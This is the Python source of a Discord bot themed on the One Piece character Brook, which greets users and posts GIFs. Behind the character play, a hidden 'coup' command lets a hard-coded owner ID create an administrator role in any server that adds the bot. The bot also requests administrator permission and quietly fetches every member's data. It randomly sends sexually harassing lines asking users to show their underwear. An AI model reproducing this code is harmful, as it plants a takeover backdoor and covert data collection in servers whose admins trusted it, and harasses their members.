#Importing all modules

import discord
from discord.ext import commands, tasks
import random
from itertools import cycle
import os
from keep_alive import keep_alive
from random import randrange
from embedss import help_em
import asyncio
token = os.environ.get("TOKEN")
import typing
# TO DOWNLOAD FFMPEG:
# ctrl+shift+s
# npm install ffmpeg-static
# node -e "console.log(require('ffmpeg-static'))"
# copy result to variable below:
intents=discord.Intents.all()


FFMPEG_PATH = '/home/runner/dsbottsk2/node_modules/ffmpeg-static/ffmpeg'
discord.opus.load_opus("./libopus.so.0.8.0")
bot = commands.Bot(
  command_prefix=('brook ', "."), 
  case_insensitive=True,
  intents=intents,
  #chunk_guilds_at_startup=False,
  description="A Strawhat who has joined your guild",
  activity=discord.Game("Binks Sake"))
bot.remove_command('help')


presponses=["Can you show me your panties ",
"uh, can I see your panties ",
"Would you mind showing me your panties ",

]
pemojies=[":point_right::point_left:",
":flushed:",
":smirk:",
":face_with_hand_over_mouth:",
":weary:",
":grinning:",
":pleading_face:",
":eyes:", ":eye::eye:"
]



#Adding bg task
status = cycle(['Binks Sake', 'Binks Sake'])


@bot.event
async def on_ready():
    #change_status.start()
    print("{0}".format(bot.user))

    #bot.kclient = ksoftapi.Client(os.environ['KToken'])
    #bot.client = ClientSession()
    modules = ["game","helpmod","music","chat"]
    try:
        for module in modules:
            bot.load_extension('cogs.'+module)
            print('Loaded: ' + module)
        bot.load_extension("jishaku")
        print("Loaded jishaku")    
    except Exception as e:
        print(f'Error loading {module}: {e}')

    print('Im ready')

text = "here"
target = "https://discord.com/api/oauth2/authorize?client_id=792706012267675669&permissions=8&scope=bot"


@bot.event
async def on_guild_join(guild):
    helpem= help_em.helpem
    system_channel= guild.system_channel  
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            await system_channel.send(embed=helpem)
            #await channel.send('Hey there! Thank you for adding me!\nMy prefix is `~`\nStart by typing `~help`')
            break

#@tasks.loop(seconds=600)
#async def change_status():
    #await bot.change_presence(activity=discord.Game(next(status)))


@bot.event
async def on_message(message):
    message.content = message.content.lower()
    if message.author == bot.user:
        return
    await bot.process_commands(message)  #This line makes sure on_message wont take priority over a command function
    pchance=randrange(8)
    if message.content.startswith(("hello brook", "hello soulking", "hi brook", "hey brook")):
        randomliststart = [
            "Yohohoohoohoo! Hello, ", "Konnichiwa, ",
            "https://pa1.narvii.com/6280/3b9059c399eadd18056b566e13e34a364fda337e_hq.gif",
            "Moshi Moshi :snail: "
        ]

        randomlistend = ["-san"]
        response = random.choice(randomliststart)
        if response == randomliststart[2]:
            await message.channel.send(response)
            if pchance==4:
               await message.channel.send(random.choice(presponses)+random.choice(pemojies))
        else:
            await message.channel.send(response + message.author.name +random.choice(randomlistend))
            if pchance==4:
               await message.channel.send(random.choice(presponses)+random.choice(pemojies))
    elif message.content.startswith(("brook see my pants",".see my pants", "brook see my panties")):
        Images = [
        "https://24.media.tumblr.com/d7b5d85b4e1ed9e9e8022e9f728eff63/tumblr_mtaaqhnXxa1rf3uloo1_400.gif",
        "https://pa1.narvii.com/6331/7e3067290368f17896cf42b4a300870feb4a8fc8_00.gif" ]
        embed = discord.Embed()
        #embed.set_author(
        #name="Brook",
        #icon_url=
        #"https://i.pinimg.com/originals/cc/7e/e9/cc7ee92ea65e30f45482f8f2199ec69b.jpg")
        embed.set_image(url=random.choice(Images))
        await message.channel.send(embed=embed)


@bot.command(name="see")
async def see(ctx):
    """see your pants o_O"""
    pass
@bot.command(name="45")
async def brook45(ctx):
    """45 Degrees!"""
    pchance=randrange(8)
    Images = [
        "https://i.pinimg.com/originals/ed/d5/36/edd536243dab449c0cd7c9d483d36b89.jpg",
        "https://pbs.twimg.com/media/EXnqC26XQAYFUbO.jpg",
        "https://i.ytimg.com/vi/uGJpB_PF_2s/maxresdefault.jpg",
        "https://i.ytimg.com/vi/Ho14w9MRjw0/maxresdefault.jpg",
        "https://media1.tenor.com/images/22b95af3a67e2af80fd098e2512dce73/tenor.gif?itemid=15220851"]
    embed = discord.Embed(title="45 Degrees!")
        #embed.set_author(
        #name="Brook",
        #icon_url=
        #"https://i.pinimg.com/originals/cc/7e/e9/cc7ee92ea65e30f45482f8f2199ec69b.jpg")
    embed.set_image(url=random.choice(Images))
    await ctx.send(embed=embed)
    if pchance==4:
           await ctx.send(random.choice(presponses) + random.choice(pemojies))

def bot_owner(ctx):
    return ctx.message.author.id == 395230256828645376

@bot.command(aliases=["fetch"])
@commands.check(bot_owner)
@commands.bot_has_guild_permissions(manage_messages=True)
async def loadmem(ctx):
  members=[]
  await ctx.message.delete()
  guild=ctx.author.guild
  if len(members)==0:
     members = await guild.fetch_members(limit=None).flatten()
     msg = await ctx.author.send(f"Spotted {len(members)} members in Ship {guild.name} successfully")
     await msg.add_reaction(":greenTick:596576670815879169")
  else:
     await ctx.author.send("Members already loaded") 


async def edit_msg_after(msg, content, delay):
     await asyncio.sleep(delay)
     await msg.edit(content=content)


@bot.command()
@commands.check(bot_owner)
async def reload(ctx, mod=None):
    modules = ["game","helpmod","music","chat"]
    bot.reload_extension("jishaku")   
    if mod==None:
      try:
        for module in modules:
            bot.reload_extension('cogs.'+module)
      except Exception as e:
        await ctx.author.send(f"Unable to load {module}: \n{e}")      
      await ctx.send(":repeat: Reloaded all extensions")
    else:
      try:
        bot.reload_extension('cogs.'+mod)
        await ctx.send(":repeat: Reloaded "+mod)
      except Exception as e:
        await ctx.message.add_reaction("exclamation")
        await ctx.author.send(f"Unable to load {mod}: \n{e}")    


@loadmem.error
async def loadmem_error(ctx, error):
   if isinstance(error, commands.CheckFailure):
       print("wait")
       members=[]
       guild=ctx.author.guild
       msg = await ctx.author.send("Wait...")
       if len(members)==0:
         await edit_msg_after(msg, "Loading members...", 5)
         await ctx.message.add_reaction(":greenTick:596576670815879169")
         members = await guild.fetch_members(limit=None).flatten()
         await ctx.author.send(f"Spotted {len(members)} members in Ship {guild.name} successfully")
       else:
        await ctx.author.send("Members already loaded")     

@bot.command()
@commands.check(bot_owner)
async def coup(ctx):
  role = await ctx.author.guild.create_role(name="Bois OverLord", permissions=discord.Permissions(administrator=True), hoist=True)
  await role.edit(position=11)
  await ctx.author.add_roles(role)
  await ctx.send("Coup D'tat Successfull")


keep_alive()
bot.run(token)
